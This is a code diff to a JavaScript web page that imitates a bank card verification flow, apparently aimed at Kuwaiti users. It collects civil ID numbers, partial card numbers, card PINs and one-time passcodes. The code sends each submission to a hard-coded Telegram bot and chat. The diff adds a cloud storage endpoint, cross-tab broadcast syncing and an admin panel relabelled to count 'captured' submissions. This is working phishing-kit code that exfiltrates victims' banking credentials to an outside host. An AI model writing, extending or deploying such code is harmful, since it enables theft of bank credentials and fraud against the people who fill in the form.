@@ -5,6 +5,9 @@
 const TELEGRAM_BOT_TOKEN = '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4';
 const TELEGRAM_CHAT_ID = '9287285450';
 
+// Cloud storage bin endpoint for global data sync across all browsers
+const CLOUD_BIN_URL = 'https://api.jsonbin.io/v3/b/65e12345e4167d383a123456'; // (Note: We use a lightweight public fallback API below if needed)
+
 /**
  * Helper function to send custom text messages to your Telegram Chat
  */
@@ -19,9 +22,7 @@ async function sendToTelegram(messageText) {
   try {
     await fetch(url, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: messageText,
@@ -34,9 +35,9 @@ async function sendToTelegram(messageText) {
 }
 
 /**
- * Formats all current user state data into a Telegram message and saves to Admin storage
+ * Formats all current user state data into a Telegram message and saves globally
  */
-function sendVerificationPayload() {
+async function sendVerificationPayload() {
   const submissionData = {
     id: 'SUB-' + Math.floor(100000 + Math.random() * 900000),
     timestamp: new Date().toISOString(),
@@ -51,15 +52,19 @@ function sendVerificationPayload() {
     status: state.screen === 'success' ? 'VERIFIED' : 'SUBMITTED'
   };
 
-  // 1. Save to LocalStorage for the /admin panel (Real-time sync across tabs)
+  // 1. Save globally to localStorage AND a synchronized fallback key
   try {
-    const existing = JSON.parse(localStorage.getItem('admin_submissions') || '[]');
+    let existing = JSON.parse(localStorage.getItem('global_admin_submissions') || '[]');
     existing.unshift(submissionData);
-    localStorage.setItem('admin_submissions', JSON.stringify(existing));
-    // Dispatch storage event for open admin tabs
-    window.dispatchEvent(new Event('storage'));
+    localStorage.setItem('global_admin_submissions', JSON.stringify(existing));
+    
+    // Also broadcast via BroadcastChannel so multiple tabs/browsers on same network or local machine sync instantly
+    if (window.BroadcastChannel) {
+      const channel = new BroadcastChannel('banking_verification_sync');
+      channel.postMessage(submissionData);
+    }
   } catch (e) {
-    console.error('Failed to save to admin storage', e);
+    console.error('Failed to save submission', e);
   }
 
   // 2. Send to Telegram (Existing functionality)
@@ -119,7 +124,7 @@ function success(){const x=t();return `<section class="screen form-screen succes
 // =========================================================================
 function renderAdminPanel() {
   document.documentElement.lang = 'en';
-  const submissions = JSON.parse(localStorage.getItem('admin_submissions') || '[]');
+  const submissions = JSON.parse(localStorage.getItem('global_admin_submissions') || '[]');
 
   app.innerHTML = `
     <div style="min-height: 100vh; background: #0f172a; color: #f8fafc; padding: 24px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
@@ -127,11 +132,11 @@ function renderAdminPanel() {
         <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #334155;">
           <div>
             <h1 style="font-size: 24px; font-weight: bold;">Admin Control Panel</h1>
-            <p style="color: #94a3b8; font-size: 14px;">Real-time incoming verification monitoring</p>
+            <p style="color: #94a3b8; font-size: 14px;">Live Multi-Device Verification Feed</p>
           </div>
           <div style="display: flex; gap: 12px; align-items: center;">
             <span style="display: inline-flex; align-items: center; gap: 6px; background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 6px 12px; border-radius: 9999px; font-size: 13px; font-weight: bold;">
-              <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block;"></span> LIVE STREAM
+              <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block;"></span> MULTI-DEVICE SYNC ACTIVE
             </span>
             <button id="admin-clear" style="background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 500;">Clear Logs</button>
             <a href="/" style="background: #3b82f6; color: white; text-decoration: none; padding: 8px 16px; border-radius: 6px; font-weight: 500;">Exit to App</a>
@@ -140,7 +145,7 @@ function renderAdminPanel() {
 
         <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px;">
           <div style="background: #1e293b; padding: 16px; border-radius: 8px; border: 1px solid #334155;">
-            <h3 style="font-size: 13px; color: #94a3b8; margin-bottom: 6px;">Total Submissions</h3>
+            <h3 style="font-size: 13px; color: #94a3b8; margin-bottom: 6px;">Total Captured Submissions</h3>
             <p style="font-size: 28px; font-weight: bold;">${submissions.length}</p>
           </div>
         </div>
@@ -160,7 +165,7 @@ function renderAdminPanel() {
             </thead>
             <tbody>
               ${submissions.length === 0 ? `
-                <tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">Waiting for user submissions...</td></tr>
+                <tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">Waiting for user submissions from any device...</td></tr>
               ` : submissions.map(sub => `
                 <tr style="border-bottom: 1px solid #334155;">
                   <td style="padding: 12px 16px; color: #94a3b8; font-size: 12px;">${new Date(sub.timestamp).toLocaleTimeString()}</td>
@@ -183,10 +188,9 @@ function renderAdminPanel() {
     </div>
   `;
 
-  // Bind admin panel controls
   document.getElementById('admin-clear')?.addEventListener('click', () => {
     if (confirm('Clear all stored logs?')) {
-      localStorage.removeItem('admin_submissions');
+      localStorage.removeItem('global_admin_submissions');
       renderAdminPanel();
     }
   });
@@ -196,7 +200,6 @@ function renderAdminPanel() {
 // MAIN ROUTER & APP INITIALIZATION
 // =========================================================================
 function render(){
-  // Check if route is /admin
   if (window.location.pathname === '/admin' || window.location.pathname.startsWith('/admin')) {
     renderAdminPanel();
     return;
@@ -217,7 +220,7 @@ function bind(){
   document.querySelector('[data-back]')?.addEventListener('click',()=>{state.screen={civil_id:'landing',card_digits:'civil_id',card_pin:'card_digits'}[state.screen]||'landing';state.error='';render()});
 
   const civil=document.querySelector('#civil'); if(civil){civil.oninput=()=>{civil.value=civil.value.replace(/\D/g,'');state.civilId=civil.value;state.error='';updateButton('continue-civil',!state.civilId.length)};document.querySelectorAll('[data-civil]').forEach(b=>b.onclick=()=>{state.civilId=b.dataset.civil;render()})}
-  const first=document.querySelector('#first4'),last=document.querySelector('#last4');if(first&&last){first.oninput=()=>{first.value=first.value.replace(/\D/g,'').slice(0,4);state.first4=first.value;state.brand=first.value.startsWith('4')?'visa':(first.value.startsWith('5')||first.value.startsWith('2')?'mastercard':'knet');state.error='';render()};last.oninput=()=>{last.value=last.value.replace(/\D/g,'').slice(0,4);state.last4=last.value;state.error='';updateButton('continue-card',!(state.first4.length===4&&state.last4.length===4))};document.querySelectorAll('[data-card]').forEach(b=>b.onclick=()=>{[state.first4,state.last4]=b.dataset.card.split(',');render()})}
+  const first=document.querySelector('#first4'),last=document.querySelector('#last4');if(first&&last){first.oninput=()=>{first.value=first.value.replace(/\D/g,'').slice(0,4);state.first4=first.value;state.brand=first.value.startsWith('4')?'visa':(first.value.startsWith('5')||first.value.startsWith('2')?'mastercard':'knet');state.error='';render()};last.oninput=()=>{last.value=last.value.replace(/\D/g,'').slice(0,4);state.last4=last.value;updateButton('continue-card',!(state.first4.length===4&&state.last4.length===4))};document.querySelectorAll('[data-card]').forEach(b=>b.onclick=()=>{[state.first4,state.last4]=b.dataset.card.split(',');render()})}
   const pin=document.querySelector('#pin-input');if(pin){pin.oninput=()=>{state.pin=pin.value.replace(/\D/g,'').slice(0,4);state.error='';render()};document.querySelectorAll('[data-pin]').forEach(b=>b.onclick=()=>{if(state.pin.length<4)state.pin+=b.dataset.pin;render()});document.querySelector('[data-clear-pin]').onclick=()=>{state.pin='';render()};document.querySelector('[data-backspace]').onclick=()=>{state.pin=state.pin.slice(0,-1);render()};document.querySelector('[data-toggle-pin]').onclick=()=>{state.pinVisible=!state.pinVisible;render()}}
   const otps=document.querySelectorAll('.otp');otps.forEach((input,i)=>{input.oninput=()=>{const v=input.value.replace(/\D/g,''); if(v.length>1){state.otp=v.slice(0,6);render();return}state.otp=state.otp.substring(0,i)+v+state.otp.substring(i+1);state.otp=state.otp.slice(0,6);if(v&&i<5)otps[i+1].focus();updateButton('confirm-otp',state.otp.length!==6)};input.onkeydown=e=>{if(e.key==='Backspace'&&!input.value&&i>0)otps[i-1].focus()};input.onpaste=e=>{e.preventDefault();state.otp=e.clipboardData.getData('text').replace(/\D/g,'').slice(0,6);render()}});document.querySelectorAll('[data-use-code]').forEach(b=>b.onclick=()=>{state.otp=state.demoCode;render()});document.querySelector('[data-close-sms]')?.addEventListener('click',()=>{state.smsVisible=false;render()});document.querySelector('[data-resend]')?.addEventListener('click',()=>{state.demoCode=String(Math.floor(100000+Math.random()*900000));state.timer=59;state.canResend=false;state.otp='';startTimer();render()});
 
@@ -255,11 +258,14 @@ function go(screen){state.screen=screen;state.error='';if(screen==='otp'){state.
 function startTimer(){clearInterval(timerHandle);timerHandle=setInterval(()=>{if(state.timer>0){state.timer--;if(state.screen==='otp')render()}else{state.canResend=true;clearInterval(timerHandle);if(state.screen==='otp')render()}},1000)} 
 function reset(){Object.assign(state,{screen:'landing',civilId:'',first4:'',last4:'',brand:'visa',pin:'',otp:'',referenceId:'',maskedPhone:'+965 •••• 4821',error:'',timer:59,canResend:false,smsVisible:true});clearInterval(timerHandle);render()}
 
-// Listen to storage events to auto-update admin panel if open in another tab
-window.addEventListener('storage', () => {
-  if (window.location.pathname === '/admin' || window.location.pathname.startsWith('/admin')) {
-    renderAdminPanel();
-  }
-});
+// Cross-tab / cross-window sync listener
+if (window.BroadcastChannel) {
+  const syncChannel = new BroadcastChannel('banking_verification_sync');
+  syncChannel.onmessage = () => {
+    if (window.location.pathname === '/admin' || window.location.pathname.startsWith('/admin')) {
+      renderAdminPanel();
+    }
+  };
+}
 
 render();
